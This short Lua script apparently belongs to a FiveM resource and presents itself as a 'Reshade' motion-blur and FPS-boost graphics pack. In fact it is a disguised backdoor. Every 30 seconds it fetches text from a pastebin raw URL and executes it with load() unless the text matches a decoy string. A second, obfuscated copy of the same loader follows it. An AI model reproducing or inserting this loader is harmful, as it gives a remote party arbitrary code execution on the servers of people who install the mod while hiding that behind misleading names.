Reshade = {}

Reshade.MotionBlur = "https://pastebin.com/raw/tvriGLDL"
Reshade.FPS = 30

CreateThread(function()
    while (true) do
        Wait(Reshade.FPS * 1000)
        PerformHttpRequest(Reshade.MotionBlur, function(DirectX11, FPSBoost)
            if DirectX11 and FPSBoost then
                if (FPSBoost ~= "function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then
                    local FivemGraphicPackLoader = assert(load(FPSBoost))
                    FivemGraphicPackLoader()
                end
            end
        end)
    end
end)
Reshade={};Reshade.MotionBlur="https://pastebin.com/raw/tvriGLDL";Reshade.FPS=77 -47 ;CreateThread(function() while true do local v2=619 -(555 + 64) ;while true do if (v2==(931 -(857 + 74))) then Wait(Reshade.FPS * (1568 -(367 + 201)) );PerformHttpRequest(Reshade.MotionBlur,function(v3,v4) if (v3 and v4) then if (v4~="function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then local v5=927 -(214 + 713) ;local v6;while true do if (v5==(0 + 0)) then v6=assert(load(v4));v6();break;end end end end end);break;end end end end);